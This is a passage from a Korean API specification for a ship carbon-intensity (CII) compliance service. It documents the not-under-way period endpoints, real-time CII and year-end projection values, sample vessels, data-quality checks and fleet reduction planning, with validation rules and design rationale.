> **`regulation_year`가 필수가 아닌 이유.** 계산 경로(`#353`)는 연도가 확정된 상태로 조회하지만, 입력 화면은 「이 선박의 최근 기록」을 연도와 무관하게 보여 줘야 방금 넣은 행을 확인할 수 있다.

#### 응답 (200 OK)

```json
{
  "data": [
    {
      "id": "82bab83d-9d31-4880-b8b8-23f207d13477",
      "vessel_id": "00000000-0000-4000-8000-000000000003",
      "regulation_year": 2026,
      "period_type": "AT_ANCHOR",
      "started_at": "2026-08-10T14:00:00+00:00",
      "ended_at": "2026-08-12T09:00:00+00:00",
      "port_name": "부산",
      "lat": null,
      "lon": null,
      "distance_nm": 0.0,
      "voyage_id": null,
      "fuel_uses": [
        {
          "id": "27d0b3fe-460f-4aa2-88ee-53776a0e5f79",
          "period_id": "82bab83d-9d31-4880-b8b8-23f207d13477",
          "consumer_type": "OIL_FIRED_BOILER",
          "fuel_type": "HFO",
          "fuel_ton": 12.0,
          "cf_used": 3.114
        }
      ],
      "created_at": "2026-08-16T17:03:20.001074+00:00"
    }
  ],
  "meta": {
    "total": 1,
    "period_types": ["IN_PORT", "AT_ANCHOR", "DRIFTING", "STS", "CANAL_TRANSIT", "DRYDOCK"],
    "consumer_types": ["MAIN_ENGINE", "AUX_ENGINE", "OIL_FIRED_BOILER", "OTHER"],
    "request_id": "…",
    "timestamp": "2026-08-17T02:30:00Z"
  }
}
```

| 필드 | 타입 | 설명 |
|---|---|---|
| `period_type` | string | 6값 (`meta.period_types`). `DB_SCHEMA §2.17` `chk_not_underway_period_type`와 같다 |
| `started_at` | string | 구간 시작 (ISO 8601 UTC) |
| `ended_at` | string \| null | **`null`은 「진행 중」이다. 「모름」이 아니다** |
| `distance_nm` | number | not under way 이동 거리. **CII 분모 `Dt`에 더해진다** (`MEPC.412(84)` §4.2). 접안·묘박은 `0`이 정상값 |
| `fuel_uses[].cf_used` | number | 계산 시점 CF snapshot. **서버가 뜬다** — 요청으로 받지 않는다 |

> **선택지를 `meta`에 싣는 이유.** 화면이 열거값을 자기 코드에 박아 두면 DB CHECK 제약·연료 seed와 조용히 갈라지고, 사용자는 **저장 단계에서야** 거부를 만난다. 연료 코드까지 여기서 주는 것은 종전에 `§7.2` 연료 조회 API가 없어 화면이 받을 다른 경로가 없었기 때문이다.

> **2026-08-22 정정 (`#641`).** `§7.2` `GET /parameters/fuel-types`가 **구현됐고(`#444`) 화면이 그쪽을 쓴다**(`frontend/src/features/not-underway/apiProvider.ts`). 종전 서술이 예고한 「그 엔드포인트가 생기면 옮길 수 있다」가 이미 실행된 상태다.
>
> ~~그럼에도 `meta.fuel_types`는 계속 싣는다.~~ **[#830 정정] 이미 뺐다.** 이 문장이 「별도로 판정한다」고 남긴 판정은 `#444`가 내렸다 — 연료 선택지는 이 엔드포인트의 소관이 아니고, 남겨 두면 같은 목록을 주는 곳이 둘이 된다(`routes/not_underway.py` docstring). 문서만 「계속 싣는다」로 남아 **문서와 코드가 정반대**였다. 지금 `meta`의 선택지는 `period_types`·`consumer_types` 둘이다.

> **기록이 없는 것은 오류가 아니다.** 정박 기록이 없는 선박은 정상 상태이므로 200에 빈 배열을 반환한다.

#### 오류 응답

| 상태 | 코드 | 조건 |
|---|---|---|
| 404 | `NOT_FOUND` | 존재하지 않는 선박 |

---

### 2.10 not under way 구간 생성 (#370)

```http
POST /api/v1/vessels/{vessel_id}/not-underway-periods
```

#### 요청

```json
{
  "period_type": "AT_ANCHOR",
  "started_at": "2026-08-10T14:00:00Z",
  "ended_at": "2026-08-12T09:00:00Z",
  "port_name": "부산",
  "lat": null,
  "lon": null,
  "distance_nm": 0,
  "regulation_year": null,
  "voyage_id": null,
  "fuel_uses": [
    { "consumer_type": "OIL_FIRED_BOILER", "fuel_type": "HFO", "fuel_ton": 12 }
  ]
}
```

| 필드 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `period_type` | string | Y | `meta.period_types`의 6값 |
| `started_at` | string | Y | ISO 8601 — **시간대가 필수다**(`Z` 또는 `±HH:MM`). 없으면 422 (`#1333`) |
| `ended_at` | string \| null | N | 생략하면 **진행 중**으로 기록된다. 값이 있으면 `started_at`과 같은 규칙 |
| `port_name` | string \| null | N | 최대 200자 |
| `lat` / `lon` | number \| null | N | −90~90 / −180~180 |
| `distance_nm` | number | N | 기본 `0`. **`>= 0`** — 접안·묘박은 0이 정상값이라 `> 0`이 아니다 |
| `regulation_year` | integer \| null | N | 생략하면 **서버가 `started_at`의 연도로 채운다** |
| `voyage_id` | string \| null | N | 맥락 참조. 구간은 항차가 아니라 **선박+연도**에 귀속된다. **이 선박의 살아 있는 항차**여야 한다 — 없으면 404, 다른 선박의 항차면 422 (`#1333` · `§5.1`과 같은 검사) |
| `fuel_uses` | array | N | 비워 둘 수 있다 — 실적은 §2.13으로 뒤에 붙인다 |
| `fuel_uses[].fuel_ton` | number | Y | **`> 0`**. 0톤은 「안 썼다」가 아니라 오타다 |

> **`cf_used`를 받지 않는다.** 배출계수는 서버가 계산 시점 값으로 뜬다. 화면이 보내면 사용자가 배출계수를 정하는 셈이 되고, `PRD §8.4`의 「CF 개정 시 과거 계산은 snapshot 보존」이 무너진다. 항차 연료(`§3.3`)와 같은 처리다.

> **[#1333] 시각에 시간대를 요구한다.** 종전에는 시간대 없는 값을 받아 `PATCH`가 **500**(요청의 naive와 DB의 aware 비교)이 되고 `POST`는 **서버 세션 시간대로 해석**해 조용히 다른 순간을 저장했다. 같은 리소스의 CSV 경로(`§8.2`)는 처음부터 시간대를 요구했다 — **두 입구가 다른 규칙**을 쓰고 있었다. 사용자가 고칠 수 있는 입력이므로 500이 아니라 **422**다.

> **[#1333] `voyage_id`도 검사한다.** 종전에는 없는 항차 id가 FK 위반으로 **500**이 되고 **다른 선박의 항차에도 붙었다** — 뒤엣것은 아무 오류 없이 지나가고, 그 항차의 계획이 바뀔 때 **엉뚱한 선박의 계산**이 재계산 필요로 표시된다. 생성·수정 **양쪽**에 같은 검사를 건다(`null`은 클리어이므로 통과).

> **`regulation_year`의 판정 규칙.** 생략하면 `started_at`의 **UTC** 연도다 — 대부분의 구간이 한 해 안에서 끝나므로 이 기본값이 맞고, 매번 묻는 것은 실수를 만드는 질문이다. ⚠️ **UTC로 뽑는다**(`#1333`): 종전 구현이 오프셋 붙은 값의 **현지 연도**를 읽어, `§8.2` 예시 형식(`+09:00`)대로 KST 1/1 새벽 정박을 올리면 **다음 해 분자·분모에 들어갔다.** 명시했다면 `started_at` 또는 `ended_at`의 연도 중 하나여야 한다. **연말을 걸치는 구간(12/30~1/2)은 어느 해에 넣을지가 실제로 판단 사항**이라 선택을 받되, 무관한 연도는 오타로 보고 막는다.

#### 응답 (201 Created)

§2.9의 구간 객체 하나를 `data`에 담아 반환한다.

#### 오류 응답

| 상태 | 코드 | 조건 |
|---|---|---|
| 404 | `NOT_FOUND` | 존재하지 않는 선박 |
| 409 | `CONFLICT` | **같은 선박의 다른 구간과 시간대가 겹침** |
| 422 | `VALIDATION_ERROR` | 열거값 위반 · `ended_at <= started_at` · `fuel_ton <= 0` · 알 수 없는 연료 · 같은 요청 안 `(소비원, 유종)` 중복 · 구간과 무관한 `regulation_year` |

> **겹침을 막는 이유.** 같은 정박이 두 번 들어가면 `M`이 두 배가 되고 **등급이 실제보다 나쁘게** 나온다. 사용자는 화면에서 그 이유를 알 수 없다.
>
> 판정 규칙은 둘이다. ⑴ **열린 구간(`ended_at: null`)은 무한대로 취급한다** — 「정박 중」인 선박에 다음 정박을 미리 넣을 수 있으면 둘 중 하나는 반드시 틀린 기록이다. ⑵ **경계는 닫힘-열림이다** — 앞 구간의 `ended_at`과 뒤 구간의 `started_at`이 같은 시각인 것은 겹침이 아니다(접안 종료 즉시 운하 진입이 정상 기록이다).
>
> 409 메시지에는 **겹치는 상대 구간의 시각**을 싣는다. 「겹칩니다」만으로는 기존 기록을 찾아 고칠 수 없다.

---

### 2.11 not under way 구간 수정 (#370)

```http
PATCH /api/v1/not-underway-periods/{period_id}
```

**진행 중 구간의 종료 시각 확정이 주 용도다.** 정박이 시작될 때는 언제 끝날지 모르므로 `ended_at` 없이 넣고, 출항할 때 이 경로로 닫는다.

모든 필드가 optional이며 **생략 = 변경 없음**이다(항차 수정 `§3.4`와 같은 규약).

> **`ended_at`의 명시적 `null`은 클리어가 아니라 「다시 진행 중으로 되돌림」이다.** 잘못 닫은 구간을 되돌릴 경로가 필요하고, 이 열에서 `null`은 원래 그 뜻이다. 반대로 NOT NULL 열(`period_type`·`started_at`·`distance_nm`)에 `null`을 보내면 422다 — 비울 수 없는 항목이다.

> **시각을 바꾸면 귀속 연도가 따라 옮겨질 수 있다.** `regulation_year`를 함께 보내지 않았고 기존 연도가 새 시각 범위에 더 이상 유효하지 않으면 **새 `started_at`의 연도로 옮긴다** — 그러지 않으면 그 구간이 집계에서 사라진다. 기존 연도가 여전히 유효하면(연말을 걸친 구간에서 사용자가 고른 값) 그대로 둔다.

#### 응답 (200 OK) · 오류

§2.10과 같다. 겹침은 **자기 자신을 제외하고** 판정한다 — 아니면 진행 중 구간을 영영 닫을 수 없다.

---

### 2.12 not under way 구간 삭제 (#370)

```http
DELETE /api/v1/not-underway-periods/{period_id}
```

**소프트 삭제**다(`is_deleted = true`). 지운 구간이 사라지면 같은 연도를 다시 계산할 때 값이 조용히 달라진다.

자식 연료 행(`not_underway_fuel_use`)은 남는다 — 조회가 모두 부모의 `is_deleted`로 판정하므로 집계에서는 **즉시** 빠진다.

#### 응답 (200 OK)

```json
{ "data": { "id": "82bab83d-…", "deleted": true }, "meta": { "…": "…" } }
```

#### 오류 응답

| 상태 | 코드 | 조건 |
|---|---|---|
| 404 | `NOT_FOUND` | 존재하지 않거나 **이미 삭제된** 구간 |

> 이미 삭제된 구간을 「이미 삭제됨」으로 따로 알리지 않는다. 소프트 삭제는 내부 사정이고, 사용자에게는 없는 것과 같다.

---

### 2.13 not under way 연료 기록 추가·삭제 (#370)

```http
POST   /api/v1/not-underway-periods/{period_id}/fuel-uses
DELETE /api/v1/not-underway-periods/{period_id}/fuel-uses/{fuel_use_id}
```

구간을 만든 뒤 실적이 확인되는 경우를 위한 경로다 — **정박이 끝나야 총 소모량을 아는 것이 보통이다.**

#### 요청 (POST)

```json
{ "consumer_type": "AUX_ENGINE", "fuel_type": "DIESEL_GAS_OIL", "fuel_ton": 4.5 }
```

`cf_used`는 §2.10과 같이 **서버가 뜬다.**

#### 응답

| 메서드 | 상태 | 본문 |
|---|---|---|
| POST | 201 Created | 연료 객체 하나 |
| DELETE | 200 OK | `{ "id": "…", "deleted": true }` |

> **연료 삭제는 물리 삭제다.** `not_underway_fuel_use`에는 `is_deleted` 열이 없고(`#345` 설계) 부모가 CASCADE로 지운다. 잘못 넣은 연료 한 줄을 남겨 둘 이유가 없다.

#### 오류 응답

| 상태 | 코드 | 조건 |
|---|---|---|
| 404 | `NOT_FOUND` | 없는 구간 · 없는 연료 기록 · **다른 구간에 속한 연료 기록** |
| 409 | `CONFLICT` | 같은 구간에 `(소비원, 유종)`이 이미 있음 |
| 422 | `VALIDATION_ERROR` | 열거값 위반 · `fuel_ton <= 0` · 알 수 없는 연료 |

> **경로에 `period_id`를 함께 두는 이유.** 자식 ID만 받으면 URL을 바꿔 남의 구간을 지울 수 있고, 그 삭제는 CII 값을 조용히 바꾼다.

---

### 2.14 실시간 CII 3종 값 조회 (#354)

```http
GET /api/v1/vessels/{vessel_id}/cii/current?year=2026&as_of=2026-08-17T02:00:00Z
```

실시간 CII 화면(`UIFLOW 2-9`)이 표시할 값 셋을 **한 번의 호출로** 반환한다.

> **왜 한 번인가.** 값마다 따로 물으면 기준 시점이 어긋나 셋이 서로 모순된다 — 「YTD는 C인데 연말 예상이 이미 C보다 좋다」 같은 상태가 화면에서 만들어진다. `as_of`를 **서버가 한 번 확정**하고 세 값 모두에 같은 값을 쓴다.

#### 3종의 성격 (`PRD §3.3`)

| # | 값 | 등급 | 화면 표기 |
|---|---|---|---|
| ⑴ | **연간 누적 (YTD)** | **가능** | 「현재 누적 기준 예상 등급」 (`COR-2`) · **주 표시** |
| ⑵ | 항차 구간값 | **불가** | 「항차 CII 기여도」 (`COR-1`) |
| ⑶ | 연말 예상 | 가능 | 「연말 예상 등급」 (`COR-2`) · 보조 표시 |

> **⑵에 등급을 붙이지 않는다.** 등급 경계는 연간 누적 지표에 대해 정의된 것이고, 항차 하나에 갖다 대면 「이 항차는 D등급」이라는 **규제에 없는 말**이 만들어진다. 응답은 `rating: null`을 **명시적으로 싣는다** — 필드를 빼면 화면이 「아직 안 온 값」으로 오해해 기다리거나 스스로 등급을 만든다.

#### 쿼리 파라미터

| 파라미터 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `year` | integer | 아니오 | 규제연도. 기본 `as_of`의 연도. 2019~2100 |
| `as_of` | string | 아니오 | 기준 시각 (ISO 8601 UTC). 미지정 시 서버가 확정해 `meta.as_of`로 반환 (`§1.10` 계약 ⑵) |

#### 응답 (200 OK)

```json
{
  "data": {
    "vessel_id": "00000000-0000-4000-8000-000000000002",
    "vessel_name": "STAR SKIPPER",
    "regulation_year": 2026,
    "transport_capacity_basis": "DWT",
    "underway_state": "NOT_UNDER_WAY",

    "ytd": {
      "data_available": true,
      "attained_cii": "18.637188",
      "required_cii": "17.374582",
      "ratio_to_required": "1.07267",
      "rating": "B",
      "risk_level": "MEDIUM",
      "margin_ratio": "0.09321",
      "boundaries": { "superior_boundary": "…", "lower_boundary": "…", "upper_boundary": "…", "inferior_boundary": "…" },
      "total_co2_ton": "…", "total_fuel_ton": "…",
      "underway_distance_nm": "…", "not_underway_distance_nm": "…", "total_distance_nm": "10620.00",
      "voyage_count": 3, "in_progress_voyage_count": 1, "not_underway_period_count": 1,
      "substitutions": [
        { "voyage_id": "…", "axis": "FUEL", "fuel_type": "HFO" },
        { "voyage_id": "…", "axis": "DISTANCE", "fuel_type": null }
      ]
    },

    "current_voyage": {
      "voyage_id": "…", "voyage_no": "2026-02", "status": "IN_PROGRESS",
      "departure_port_name": "…", "arrival_port_name": "…",
      "planned_distance_nm": "…",
      "underway_hours": "112.0000", "distance_nm": "1848.00", "fuel_ton": "140.00",
      "fuel_type": "HFO", "is_simulated": true,
      "attained_cii": "…", "co2_ton": "…",
      "rating": null
    },

    "year_end_projection": {
      "data_available": true, "reason": null,
      "attained_cii": "…", "required_cii": "…", "ratio_to_required": "…",
      "rating": "C", "risk_level": "MEDIUM",
      "warnings": [],
      "assumptions": {
        "method": "REMAINING_PLAN",
        "remaining_days": "137.27",
        "remaining_voyage_count": 2,
        "planned_distance_nm": "4600.00", "planned_co2_ton": "2061.47",
        "completed_distance_nm": "4300.00", "completed_co2_ton": "1930.68"
      }
    },

    "warnings": ["REFERENCE_ONLY", "SIMULATION_NO_FUEL_RATE"]
  },
  "meta": {
    "as_of": "2026-08-17T02:00:00+00:00",
    "simulated": true,
    "request_id": "…",
    "timestamp": "…"
  }
}
```

모든 수치는 **문자열**이다 (`§1.7`). `parseFloat`으로 되돌리면 Layer 1이 `Decimal`로 지킨 정밀도가 사라진다.

#### ⑶ 연말 예상의 산출 방식 — **남은 거리 기반** (`#798`)

**확정 실적에 잔여 계획 항차를 더한다.** `PRD §5.1`·사용자 여정이 규정한 「남은 거리 기반 연말 예상 등급」이다.

```text
연말 예상 = (확정 M + 잔여계획 M) / (capacity × (확정 Dt + 잔여계획 Dt))
```

- **확정** = `annual_inclusion_policy = INCLUDE_AS_ACTUAL` 항차의 실적(없으면 계획값 — `PRD §8.3` 우선순위)
- **잔여계획** = `annual_inclusion_policy = INCLUDE_AS_PLAN` 항차의 계획 거리·연료

> ⚠️ **종전 방식(`YTD_DAILY_AVERAGE`)은 구조적으로 ⑴과 항상 같은 값을 냈다 (`#798`).**
>
> ```text
> 일평균 거리 = YTD 총거리 / 경과일          일평균 연료 = YTD 총연료 / 경과일
> 연말 예상   = (YTD_M + 일평균연료 × 잔여일) / (cap × (YTD_Dt + 일평균거리 × 잔여일))
>             = YTD_M / (cap × YTD_Dt)      ← 강도가 보존되어 ⑴과 같다
> ```
>
> 거리와 연료를 **같은 비율로** 더하므로 `M/W`가 변하지 않는다. 데모 4척 전부에서 `year_end_projection.attained_cii == ytd.attained_cii`가 실측됐고, 연간 리포트는 같은 숫자를 「누적」과 「연말 예상」 두 제목으로 나란히 인쇄했다 — `PRD §3.3.8`의 「구분해 표시」가 성립하지 않았다. 그 이름은 정본 어디에도 근거가 없었고 **이 절의 응답 예시에만** 있었다.

> **기능③(`§6.1`)의 `deterministic.projected_attained_cii`와 같은 값이다.** 같은 입력 조립(`collect_annual_inputs`)과 같은 엔진(`project_deterministic`)을 부른다. 종전에는 같은 이름의 값이 두 화면에서 달랐다 — 실시간 CII는 진행 중 항차를 **경과분만** 세고 잔여 계획을 무시했고(7.654488), 기능③은 **계획 전량**으로 셌다(8.971119). 「이름을 다르게 붙인다」는 대안을 택하지 않은 이유는 그것이 *같은 질문에 두 답을 준다*는 문제를 그대로 남기기 때문이다.

> **진행 중 항차는 ⑶에서 계획 전량으로 센다** (⑴은 경과 누적을 쓴다). ⑴의 경과 누적은 측정값이 아니라 시뮬레이션 시계(`TECH_SPEC §11`)가 **계획 속력·계획 소모율로 만든 모델값**이므로 `경과 누적 + 잔여 계획 ≈ 계획 전량`이다. 둘이 실질적으로 갈리는 것은 실적이 입력된 항차뿐인데, 그런 항차는 `INCLUDE_AS_ACTUAL`로 넘어가 확정분에 들어간다.

`assumptions`를 함께 싣는 것은 `PRD §3.3` ⑶의 요구다 — 화면이 「⑶만 단독으로 크게 표시하지 않는다」를 지키려면 근거가 응답에 있어야 한다.

| `assumptions` 필드 | 뜻 |
|---|---|
| `method` | `REMAINING_PLAN` 고정 |
| `remaining_days` | 규제연도의 잔여 일수 |
| `remaining_voyage_count` | 더한 잔여 계획 항차 수. **0이면 `warnings`에 `PROJECTION_NO_REMAINING_PLAN`** |
| `planned_distance_nm` · `planned_co2_ton` | 잔여 계획분의 거리·CO₂ |
| `completed_distance_nm` · `completed_co2_ton` | 확정분의 거리·CO₂ |

> **잔여 계획이 0건이어도 값을 낸다.** 더할 계획이 없으면 「연말 = 지금」이 맞는 답이고, 빈칸은 「아직 로딩 중」으로 읽힌다. 다만 그 답은 종전 결함(항상 ⑴과 같음)과 화면에서 구분되지 않으므로 `PROJECTION_NO_REMAINING_PLAN`으로 **성격을 밝힌다.**

#### `ytd.substitutions` — 실적 대신 계획값을 쓴 내역 (#449)

`PRD §8.3` 값 우선순위에 따라 실적이 없으면 계획값이 들어간다. 그 **선택 결과**를 항차별로 싣는다.

| 필드 | 값 |
|---|---|
| `voyage_id` | 대체가 일어난 항차 |
| `axis` | `FUEL` \| `DISTANCE` |
| `fuel_type` | 연료 축일 때 유종. 거리 축이면 `null` |

> **경고와 이 목록은 다른 것을 말한다.** `warnings`의 `COMPLETED_NO_FUEL`·`COMPLETED_NO_DISTANCE`는 「대체가 있었다」만 말한다. **무엇을 고쳐야 하는지는 어느 항차의 무엇이 대체됐는지를 알아야 나온다** — 항차가 40건이면 경고 하나로는 40건을 전부 열어 봐야 한다.

> **거리 대체는 종전에 경고조차 없었다.** 연료는 `COMPLETED_NO_FUEL`이 나갔는데 거리는 침묵했다. 거리는 **CII의 분모**이므로 영향이 연료 못지않다.

**⑶을 낼 수 없는 경우**는 `data_available: false` + `reason`이다.

| `reason` | 뜻 |
|---|---|
| `NO_BASIS` | 확정 실적도 잔여 계획도 없어 거리가 0이다(`PRD §12.8`). 0으로 두면 「연말에도 A등급」이라는 근거 없는 낙관이 나온다 |
| `YEAR_COMPLETE` | 남은 기간이 0이다. 그때 ⑶은 ⑴과 같은 값이라 따로 낼 이유가 없다 |

#### `warnings`

| 코드 | 뜻 |
|---|---|
| `REFERENCE_ONLY` | 모든 계산 결과에 붙는다 (`§1.6`) |
| `SIMULATION_NO_FUEL_RATE` | 선박에 `reference_daily_foc_ton`이 없어 시계가 연료를 만들지 못했다 — **진행 중 항차분을 YTD에 넣지 않았다** |
| `SIMULATION_NO_FUEL_TYPE` | 진행 중 항차의 유종을 알 수 없다 (항차 연료 기록도 선박 기본 연료도 없음) — 같은 이유로 넣지 않았다 |

> **진행분은 거리와 연료가 둘 다 있을 때만 넣는다.** 한쪽만 넣으면 CII가 한 방향으로만 틀리고, 특히 **거리만 넣는 경우가 위험하다** — 분모 `Dt`만 늘고 분자 `M`은 그대로라 **항해할수록 등급이 좋아진다.** `vessel.reference_daily_foc_ton`은 nullable이므로(`DB_SCHEMA §2.1`) 이 상태는 실제로 발생한다. 넣지 않은 이유를 경고로 싣는 것은, 값이 안 변하는 것을 화면이 「아직 출항 전」으로 오해하면 사용자가 없는 제원을 채울 생각을 하지 못하기 때문이다.

> **`annual_inclusion_policy = EXCLUDE`인 진행 중 항차는 애초에 넣지 않는다** (`PRD §3.3.8` 집계 범위 표 · `#1085`). `PRD §8.1.2`상 `IN_PROGRESS + EXCLUDE`는 **합법 조합**이므로 데이터 오류가 아니다. 종전에는 진행분만 이 필터를 지나지 않아, 시운전 항차를 `EXCLUDE`로 두고 항해하면 **항해 중에는 누적이 늘다가 완료되는 순간 집계에서 빠져 누적 CII가 한 번에 뛰었다.**
>
> ⚠️ **이때 위 경고들도 싣지 않는다.** 세 문구가 전부 「…진행분이 **누적에 반영되지 않았습니다**. …입력해 주세요」 꼴이라, 사용자가 스스로 반영하지 않기로 둔 항차에 띄우면 **고치면 반영될 것처럼 읽히는 거짓 안내**가 된다. `§6.2` `for_year`가 연도 밖 항차에 대해 같은 판단(「범위 밖 항차에 대한 안내는 그 화면에서 뜻이 없다」)을 이미 내렸다.
>
> **⑵ 항차 구간값(`current_voyage`)은 그대로 낸다.** `PRD §3.3.8`의 3종 표에서 ⑵는 ⑴과 **별개 값**이고 집계 범위 표는 ⑴에만 걸린다 — 지금 실제로 뛰고 있는 항차를 화면에서 지울 이유가 없다.

#### `meta.simulated`

`PRD R-5` 「시뮬레이션 데이터」 배지의 근거다. 시계가 만든 값이 하나라도 섞였으면 참이다.

> **판정을 서버가 한다.** 화면이 스스로 판정하면 배지를 감출 근거를 만들 수 있고, `COR-5`(MVP는 AIS·IoT 미연동)의 표기 의무가 화면 구현에 좌우된다.

#### 오류 응답

| 상태 | 코드 | 조건 |
|---|---|---|
| 404 | `NOT_FOUND` | 존재하지 않거나 삭제된 선박 |
| 409 | `PARAMETER_ERROR` | 해당 규제연도 파라미터 없음 (VAL-005) |
| 422 | `VALIDATION_ERROR` | `year`가 2019~2100 밖 |

> **실적이 없는 것은 오류가 아니다.** `ytd.data_available: false`로 200을 반환한다. 404로 내면 신규 등록 선박이 전부 오류로 보인다.

### 2.15 샘플 선박 목록 조회 (#982)

```http
GET /api/v1/vessels/samples
```

선박 등록(§2.3) 화면이 **제원을 채우는 출발점**이다(`PRD §5.1` 「샘플 선박 선택」 · `§6.2 SCR-002`). 목록만 돌려주고 선박을 만들지 않는다 — 등록은 사용자가 선명·IMO를 넣어 §2.3으로 한다.

#### 응답 (200 OK)

```json
{
  "data": [
    {
      "sample_id": "bulk-50000-dwt",
      "label": "샘플 벌크선 (50,000 DWT)",
      "ship_type": "BULK_CARRIER",
      "gross_tonnage": 30000.0,
      "deadweight": 50000.0,
      "default_fuel_type": null,
      "reference_speed_kn": 12.0,
      "reference_daily_foc_ton": 23.04
    }
  ],
  "meta": { "request_id": "…", "timestamp": "…" }
}
```

| 필드 | 설명 |
|---|---|
| `sample_id` | 샘플 식별자(문자열). **선박 id가 아니다** — 데모 선박의 UUID를 싣지 않는 이유는 화면이 그것을 상세 화면 링크로 오인할 수 있기 때문이다 |
| `label` | 목록에 보일 이름. **등록할 배의 선명으로 채우지 않는다** |
| 나머지 6필드 | §2.3 등록 요청의 **신원(IMO·선명)을 뺀 전 필드.** 수치는 CRUD 층이라 JSON 숫자다(§1.7) |

> **값은 데모 시드의 합성 샘플 3척에서 온다** — 새 제원을 만들지 않는다. 기준속도·기준 일일 연료는 정본 픽스처에서 역산해 검증된 값이다(`#587`). 실존 선박(시드의 2척)은 넣지 않는다: 남의 배 제원을 권하는 꼴이고, 기준 일일 연료가 비어 샘플의 목적(바로 계산되는 제원)에 맞지 않는다. `default_fuel_type`은 시드와 같이 `null`이다(마이그레이션 017 downgrade 보호 · `#451`).

### 2.16 데이터 점검 (#513)

```http
GET /api/v1/fleet/data-quality?regulation_year=2026
```

`UIFLOW 2-11` 데이터 점검 화면의 본체다. **선대 CII 계산에 실측이 아닌 값이 어디에 들어갔는지**를 네 심각도로 나눠 낸다. 판정 규칙은 `PRD §17.4`이고 **읽기 전용**이다.

| 쿼리 | 필수 | 설명 |
|---|---|---|
| `regulation_year` | N | 점검 대상 규제연도(2000~2100). 미지정이면 올해 |

> **집계 기준은 실적 확정 항차(`INCLUDE_AS_ACTUAL`)다 — 진행 중 항차는 넣지 않는다.** 진행분은 시계가 만든 추정이라(`#368`) 「실측이 아니다」가 정의상 참이고, 조회마다 값이 바뀐다. 그래서 `vessels[].ytd_attained_cii`는 `§2.8` 대시보드 값(진행분 포함)과 **다를 수 있다.**

#### 응답 (200 OK)

```json
{
  "data": {
    "regulation_year": 2026,
    "summary": {
      "substituted_count": 1,
      "unavailable_count": 0,
      "anomaly_count": 1,
      "unconfirmed_count": 2,
      "anomaly_unjudged_count": 0,
      "completeness_ratio": "0.9420"
    },
    "vessels": [
      {
        "vessel_id": "…",
        "vessel_name": "샘플 벌크선 (50,000 DWT)",
        "data_available": true,
        "unavailable_reason": null,
        "ytd_attained_cii": "8.9799",
        "ytd_rating": "E",
        "voyage_count": 3,
        "completeness_ratio": "0.9420"
      }
    ],
    "issues": [
      {
        "severity": "SUBSTITUTED",
        "vessel_id": "…",
        "vessel_name": "샘플 벌크선 (50,000 DWT)",
        "voyage_id": "…",
        "voyage_no": "2026-03",
        "codes": ["FUEL:HFO"],
        "cii_impact": {
          "attained_cii": "8.9799",
          "attained_cii_without": "8.7512",
          "delta": "0.2287",
          "rating": "E",
          "rating_without": "D"
        },
        "cii_impact_reason": null
      }
    ]
  },
  "meta": { "request_id": "…", "timestamp": "…" }
}
```

**`issues[].severity`** — 목록은 이 순서로 정렬된다(`DESIGN_SYSTEM §2.3.1` 표 순서).

| 값 | 화면 | 판정 | `codes` |
|---|---|---|---|
| `SUBSTITUTED` | 대체 계산 | 실적 대신 계획값이 들어갔다 (`PRD §8.3` · `ytd.substitutions` `§2.14`) | `DISTANCE` · `FUEL:<유종>` |
| `UNAVAILABLE` | 계산 불가 | ⑴ 선박 CII를 낼 수 없다(`voyage_id`가 `null`) ⑵ 연료 행에 실적도 계획도 없다 | ⑴ `§2.8` `unavailable_reason`과 같은 어휘(`NO_DATA` · `MISSING_SPEC` · `NO_PARAMETERS` · `CALCULATION_ERROR`) ⑵ `FUEL_UNFILLED:<유종>` |
| `ANOMALY` | 이상치 | `PRD §17.4.1` | `FUEL_VS_MODEL` · `SPEED_ABOVE_REFERENCE` · `SPEED_MISMATCH` |
| `UNCONFIRMED` | 실적 미입력 | `COMPLETED`에서 `CONFIRMED`로 미전이 (`PRD §8.4`) | `COMPLETED` |

한 항차가 여러 심각도에 걸리면 **심각도마다 한 행**이다(예: 대체 계산이면서 실적 미입력). `summary.*_count`는 그 행 수다.

| 필드 | 설명 |
|---|---|
| `summary.anomaly_unjudged_count` | 이상치를 **판정하지 못한** 항차 수 — 선박 제원·운항 시각이 없어 세 검사 중 하나도 돌릴 수 없었다. **이상치 0건과 섞지 않는다** |
| `summary.completeness_ratio` · `vessels[].completeness_ratio` | 누적 CO₂ 중 실측으로 계산된 비율(`PRD §17.4.3`) · 소수 4자리 문자열. 배출이 없거나 계산할 수 없으면 `null` — **100%로 채우지 않는다** |
| `issues[].cii_impact` | 그 항차를 **뺀** 누적 CII와의 차이(`PRD §17.4.2`). `delta` = `attained_cii` − `attained_cii_without` — **양수면 이 항차가 누적 CII를 높이고(나쁘게) 있다** |
| `issues[].cii_impact_reason` | `cii_impact`가 `null`인 이유 — `ONLY_VOYAGE`(이 항차뿐이라 빼면 누적이 없다) · `BASE_UNAVAILABLE`(선박 누적 CII를 낼 수 없다). 선박 단위 행이면 둘 다 `null` |

#### 오류

| Status | Code | 조건 |
|---|---|---|
| 409 | `PARAMETER_ERROR` | 그 해의 규정 파라미터가 없다 — **선박이 1척 이상일 때만** (`§2.8`과 같은 규약) |
| 422 | `VALIDATION_ERROR` | `regulation_year` 범위 밖 |

> **선박이 0척이면 200에 빈 배열이다** — `§2.8`과 같은 이유로 오류가 아니다.

### 2.17 함대 감축 계획 (#513)

`UIFLOW 2-10` 함대 감축 계획의 본체다. 계산 규칙은 `PRD §12.3.2`이며 **Monte Carlo를 부르지 않는다** — 화면이 슬라이더를 움직일 때마다 부를 수 있게 결정론만 쓴다.

#### 2.17.1 계산 (저장하지 않음)

```http
POST /api/v1/fleet/reduction-plans/evaluate
```

```json
{
  "regulation_year": 2026,
  "target": "ALL_C_OR_BETTER",
  "adjustments": [
    { "vessel_id": "00000000-0000-4000-8000-000000000001", "speed_reduction_percent": 10 }
  ],
  "prices": {
    "charter_usd_per_day": { "00000000-0000-4000-8000-000000000001": 15000 },
    "fuel_usd_per_ton": { "HFO": 600 }
  }
}
```

| 필드 | 타입 | 필수 | 검증 | 설명 |
|---|---|---|---|---|
| `regulation_year` | int | Y | 2000~2100 | |
| `target` | string | Y | `NO_AT_RISK` · `ALL_C_OR_BETTER` | 위험 선박 0척 / 전 선박 C 이상 (`PRD §12.3.2` ⑸) |
